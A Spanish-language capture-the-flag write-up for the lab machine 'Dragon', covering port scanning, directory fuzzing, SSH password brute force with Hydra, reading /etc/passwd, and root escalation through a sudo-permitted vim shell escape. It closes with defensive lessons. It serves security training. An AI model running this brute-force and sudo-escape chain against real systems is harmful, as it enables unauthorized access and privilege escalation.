# Dragon

**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 23/07/2026

## 0. Resumen

Máquina Linux fácil con temática de dragones

El camino de explotación combina:
- Enumeración web para descubrir un directorio oculto con una pista sobre el nombre de un usuario
- Fuerza bruta SSH con Hydra para el acceso inicial
- Escalada directa a root abusando de un permiso `sudo` mal configurado sobre `vim`

## 1. Reconocimiento

###   Ping

```bash
ping -c 2 <IP>
```

<img width="977" height="125" alt="image" src="https://github.com/user-attachments/assets/bf178722-4f4d-4c2b-bc2d-a54e07c07264" />

→ TTL=64 sugiere que se trata de un host Linux

##    Nmap

```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA dragon
```

| Flag | Función |
|---|---|
| `-p-` | Escanea todos los puertos (1–65535) |
| `--open` | Muestra solo puertos abiertos |
| `-sC` | Scripts NSE por defecto |
| `-sV` | Detección de versión de los servicios |
| `-Pn` | Omite el descubrimiento de host |
| `-n` | No resuelve nombres DNS |
| `--min-rate 5000` | Acelera el escaneo (paquetes/segundo) |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |

**Resultados:**

- Puerto 22: OpenSSH 9.6p1 (Ubuntu 13)
  
- Puerto 80: Apache 2.4.58, sitio "

Solo dos servicios expuestos: SSH y un servidor web Apache

La estrategia habitual en este tipo de máquinas es usar la web para conseguir información (usuario, credenciales, etc.) y SSH como vía de acceso final

## 2. Enumeración web

<img width="1397" height="357" alt="image" src="https://github.com/user-attachments/assets/c573e8d1-047d-43b3-af62-450a54201358" />

### 2.1 Navegación inicial

La página principal no revela nada relevante a simple vista ni en el código fuente. Toca pasar a fuzzing de directorios

### 2.2 Fuzzing de directorios

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
```

| Flag | Función |
|---|---|
| `dir` | Modo de enumeración de directorios |
| `-u` | URL objetivo |
| `-w` | Wordlist de nombres comunes |
| `-x` | Extensiones a probar además de directorios "pelados" |
| `-t 30` | Nº de hilos en paralelo |

<img width="1068" height="239" alt="image" src="https://github.com/user-attachments/assets/c5d5eea7-9bda-4ce9-8f31-7c218e9f9a13" />

→ Directorio encontrado: `/secret`

### 2.3 Pista del nombre de usuario

<img width="1134" height="319" alt="image" src="https://github.com/user-attachments/assets/5843192c-a8f3-4392-aadd-60246e15359b" />

Al acceder a `/secret` aparece un mensaje que apunta a`dragon` como nombre de usuario del sistema

## 3. Acceso inicial — Fuerza bruta SSH

## 3.1 Hydra

```bash
hydra -l dragon -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

| Flag | Función |
|---|---|
| `-l dragon` | Usuario objetivo fijo |
| `-P rockyou.txt` | Diccionario de contraseñas |
| `ssh://<IP>` | Protocolo y dirección objetivo |

<img width="1209" height="184" alt="image" src="https://github.com/user-attachments/assets/bdb3f74d-8185-40fb-be3c-36f055e3b1ef" />

→ Credenciales válidas: `dragon : shadow`

### 3.2 Conexión SSH

```bash
ssh dragon@<IP>
```

## 3.3 Verificación adicional de usuarios del sistema

```bash
cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
```

<img width="881" height="37" alt="image" src="https://github.com/user-attachments/assets/f1505f4e-41d8-400c-8d92-df4a656a94b9" />

→ No existen más usuarios en el sistema

## 4. Escalada a root

### 4.1 Enumeración de permisos sudo

```bash
sudo -l
```

<img width="1034" height="46" alt="image" src="https://github.com/user-attachments/assets/5c1ab6e6-6374-4323-9425-efebd2f8b924" />

→ Hallazgo clave: `dragon` puede ejecutar `/usr/bin/vim` como cualquier usuario (`ALL`) sin contraseña (`NOPASSWD`)

### 4.2 ¿Por qué es explotable?

`vim` permite ejecutar comandos de shell desde su propio editor mediante `:!comando`

Si el binario se lanza vía `sudo` sin pedir contraseña, ese comando externo hereda los privilegios con los que se ejecutó `vim`, en este caso, root

Exploramos las opciones disponibles en GTFOBins buscando la palabra vim

<img width="932" height="192" alt="image" src="https://github.com/user-attachments/assets/ce0c5a0e-b0eb-42ca-ab88-93cc133aa8a5" />

### 4.3 Explotación

```bash
sudo -u root /usr/bin/vim -c ':!/bin/sh' /dev/null
```

→ Shell con privilegios hereda el UID de root (indicado por el cambio de prompt de `$` a `#`)

### 4.4 Primera flag (dragon)

```bash
cat /home/dragon/user.txt
```

### 4.5 Segunda flag (root)

```bash
cat /root/root.txt
```

## 5. Lecciones aprendidas

<img width="1041" height="531" alt="image" src="https://github.com/user-attachments/assets/01cad85e-6cc1-4a87-bae1-1598381a8cb8" />

- **Información expuesta en la web:** directorios "ocultos" pero no autenticados (como `/secret`) pueden filtrar pistas críticas — nombres de usuario, contraseñas o mensajes internos nunca deberían ser accesibles públicamente

- **Contraseñas débiles:** políticas de contraseñas robustas y, si es posible, autenticación SSH solo por clave pública en lugar de contraseña
  
- **`sudo -l` es el primer paso obligatorio:** tras conseguir cualquier shell con privilegios limitados ya que revela, de inmediato, vectores de escalada evidentes
  
- **Permisos de sudo mal configurados:** nunca otorgar `NOPASSWD` sobre binarios con capacidad de escapar a una shell (editores, paginadores, intérpretes, etc.). GTFOBins es la referencia obligada para auditar qué binarios son peligrosos bajo sudo
  
- **Principio de mínimo privilegio:** si un usuario necesita ejecutar `vim` como root para una tarea puntual, es preferible restringir el alcance (por ejemplo, mediante wrappers o restricción de argumentos) en lugar de dar acceso total sin contraseña
